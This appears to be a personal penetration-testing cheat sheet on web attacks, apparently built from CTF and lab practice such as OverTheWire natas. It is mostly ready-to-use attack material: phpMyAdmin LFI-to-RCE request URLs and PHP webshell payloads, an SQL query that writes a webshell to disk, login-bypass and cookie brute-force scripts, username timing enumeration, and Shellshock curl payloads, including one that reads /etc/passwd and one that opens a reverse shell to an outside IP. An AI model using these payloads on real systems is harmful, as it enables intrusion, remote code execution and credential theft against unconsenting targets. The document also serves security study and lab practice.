# Web attacks

temp[https://www.cvedetails.com/vulnerability-list/](https://www.cvedetails.com/vulnerability-list/)

## Checklist

{% embed url="https://pentestbook.six2dez.com/others/web-checklist" %}

{% embed url="https://github.com/rkhal101/Web-Security-Academy-Series/tree/main" %}

## curl

{% code overflow="wrap" %}
```bash
curl -i $IP
curl $IP -s -L | html2text -width '99' | uniq

--ignore-content-length # if the file to read has 0 bytes but has text inside anyway

# Write all the payloads in a text file bypass.txt

# Then used a simple loop in BASH to read each line and try it against the website:
while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s' "$p"; curl -s -d "username=$p" -d "password=" http://$IP/$PATH | grep THM; printf "\n"
done < bypass.txt
```
{% endcode %}

## wget

```bash
-O- # will output to stdout
```

## Advanced enumeration for loot

```
Download a folder from the web server with wget -r 

Then go to that folder and grep -r -E -i "user|pass|key|database" | less -S
```

## PHPmyadmin

[https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)

{% tabs %}
{% tab title="Change password" %}
When we get access to the panel and see an interesting account with a hashed password, instead of cracking it we could try to change the password.

```
UPDATE 'table' set 'pass' = 'pass1234' where 'table'.'ID' = 1;
```
{% endtab %}

{% tab title="4.8.1 - LFI to RCE (Manual)" %}
Go to SQL > execute query

```
SELECT '<pre><?php echo shell_exec($_GET["cmd"]);?>'
```

Note PHPMyAdmin **PHPESSID** **cookie** value and then run

{% code overflow="wrap" %}
```
http://$IP/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_$PHPMYADMIN_COOKIE&cmd=ls
```
{% endcode %}

Different paths for the PHP session

```bash
/var/lib/php/sessions/
/var/lib/php/session/
/var/lib/php5/sessions/
/var/lib/php5/sess_
# Windows: 
C:\Windows\Temp\
```

ANOTHER WAY

[https://cupuzone.wordpress.com/2018/07/23/a-little-study-about-latest-phpmyadmin-4-8-0-4-8-1-lfi-vulnerability/](https://cupuzone.wordpress.com/2018/07/23/a-little-study-about-latest-phpmyadmin-4-8-0-4-8-1-lfi-vulnerability/)

Test the vulnerability:

```
/index.php?target=db_sql.php%253f/../../../../../../../../../../../etc/passwd
```

Go to signon.php (examples/signon.php)and input this on username (shell between double quotes):

```php
<pre><?php echo shell_exec($_GET["shell"]);?>
```

Note the cookie **SignonSession** and then get RCE:

{% code overflow="wrap" %}
```
website.com/index.php?target=db_sql.php%253f/../../../../../../../../../../../var/lib/php/sessions/sess_vp5tmadp1jm0299tkqvk2rklml&shell=ls
```
{% endcode %}
{% endtab %}

{% tab title="4.8.1 exploit" %}
{% embed url="https://www.exploit-db.com/exploits/50457" %}
{% endtab %}

{% tab title="Webshell" %}
| [https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/) |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

After logging in and with the privileges to write files, we go to **SQL** to execute this query:

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```

{% hint style="info" %}
TRY PATHS SUCH AS /var/www/html, /var/www/phpmyadmin...

On Windows, try something like`'C:\\xampp\\phpmyadmin\\cmd.php'`
{% endhint %}

Now we visit the webpage to have a webshell:

![](<../../.gitbook/assets/image (84).png>)
{% endtab %}
{% endtabs %}

## Login form - timing attack to enumerate usernames

In case an invalid username takes more/less than time than a valid username, we can enumerate usernames using a timing attack.

With Dev Tools we can see method request, path and parameters:

![](<../../.gitbook/assets/image (59).png>)

In Python, we can use this code and the Requests library to send this request as follows:

```
creds = {"username":username,"password":"invalidPassword!"}
response = r.post(URL,json=creds)
```

The next stage is timing this. Using the "time" standard library, we can work out the time difference between when we send the request and when we get a response.&#x20;

```
startTime = time.time()
doLogin(user)
endTime = time.time()
```

The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.

**Why does the time taken change?**

The **backend** is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The **pseudocode** to explain this better is below.

{% code fullWidth="true" %}
```php
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```
{% endcode %}

Pre-written exploits in Golang and Python are available here: [https://github.com/NinjaJc01/hackerNoteExploits](https://github.com/NinjaJc01/hackerNoteExploits)

Use the Honeypot capture or Names/names.txt from [https://github.com/danielmiessler/SecLists/tree/master/Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames). The shorter the list is, the faster the exploit will complete.

{% hint style="info" %}
The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.
{% endhint %}

## Cookies

{% tabs %}
{% tab title="Brute force incremental cookie" %}
```python
#/usr/bin/python3

import requests

url = 'http://natas18.natas.labs.overthewire.org/'

s = requests.Session()
s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for x in range(641):
        cookie = dict(PHPSESSID=str(x))   # this is the way to send a cookie
        #cookie = {'PHPSESSID': str(x)}   also valid
        r = s.get(url, cookies=cookie)    # only get is necessary if we already logged in with admin username
        #r = s.post(url, data={'username': 'admin', 'password': 'test'}, cookies=cookie)  another valid way
        if "Login as an admin" in r.text:
                pass
        else:
                print(r.text)
                break
```
{% endtab %}

{% tab title="Brute force non-sequential cookie" %}
```python
#If we see the cookie is something like 3137342d61646d696e --> hex, we can decode it:
echo "3137342d61646d696e" | xxd -r -p
174-admin

#So now we can create a script to guess the number that accompanies admin:
#/usr/bin/python3

import requests

url = 'http://natas19.natas.labs.overthewire.org/'

s = requests.Session()
s.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for x in range(641):
        cookie = (str(x) + '-admin').encode('utf-8')
        cookie = cookie.hex()             # convert string cookie to hex
        cookie = dict(PHPSESSID=cookie)   # this is the way to send a cookie
        r = s.get(url, cookies=cookie)    # only get is necessary if we already logged in with admin username
        if "Login as an admin" in r.text:
                pass
        else:
                print(r.text)
                break
```
{% endtab %}
{% endtabs %}

## Shellshock

If /cgi-bin/, .cgi, .pl, .sh files are found in a web server --> think of this attack

[https://blog.cloudflare.com/inside-shellshock/](https://blog.cloudflare.com/inside-shellshock/)

`User-Agent: () { : ;}` --> Inject here the payload

```bash
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' $URL 2>/dev/null| grep 'VULNERABLE'
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"

#Blind with sleep 
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' $URL

#IF ONE OF THE ABOVE WORKS, TRY REVERSE SHELL
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.2.5/443 0>&1' $URL
```

## Port knocking - Filtered ports

{% tabs %}
{% tab title="knockd" %}
#### [https://zeroflux.org/projects/knock](https://zeroflux.org/projects/knock)

```bash
#Configuration file can be found on /etc/knockd.conf
apt install knockd
knock $IP $seq1 $seq2 .........
```
{% endtab %}

{% tab title="hping3" %}
{% code overflow="wrap" %}
```
hping3 -S -p 159 -c 1 192.168.56.101; hping3 -S -p 27391 -c 1 192.168.56.101; hping3 -S -p 4 -c 1 192.168.56.101
```
{% endcode %}
{% endtab %}

{% tab title="Manual - nmap" %}
```bash
for x in $PORT1 $PORT2 $PORT3; do nmap -Pn --max-retries 0 -p $x $IP; done
```
{% endtab %}
{% endtabs %}

## Octal format for IP addresses

If you need to deal with bad chars such as periods in IP addresses while testing for RCE, you may want to convert them to octal format with this tool [https://www.browserling.com/tools/ip-to-oct](https://www.browserling.com/tools/ip-to-oct).

## Bypass WAF / Access Forbidden/403 content

Set X-Forwarded-For header or other X-Forwarded-X headers

## IDS - portspoof

[https://www.linux-magazine.com/Online/Features/Trick-Attackers-with-Portspoof](https://www.linux-magazine.com/Online/Features/Trick-Attackers-with-Portspoof)

## Interactsh (web client with domain to collect info such as Burp Collaborator)

[https://app.interactsh.com/#/](https://app.interactsh.com/#/)

Web Client we can use to collect info by checking the response (headers for example)

## Further reading

[https://requests.readthedocs.io/en/master/user/quickstart/](https://requests.readthedocs.io/en/master/user/quickstart/)

﻿**Timing attacks on logins**\
[https://seclists.org/fulldisclosure/2016/Jul/51](https://seclists.org/fulldisclosure/2016/Jul/51)\
[https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)\
[https://wiki.owasp.org/index.php/Testing\_for\_User\_Enumeration\_and\_Guessable\_User\_Account\_(OWASP-AT-002)](https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_\(OWASP-AT-002\))

**Adobe Password Breach**\
[https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)

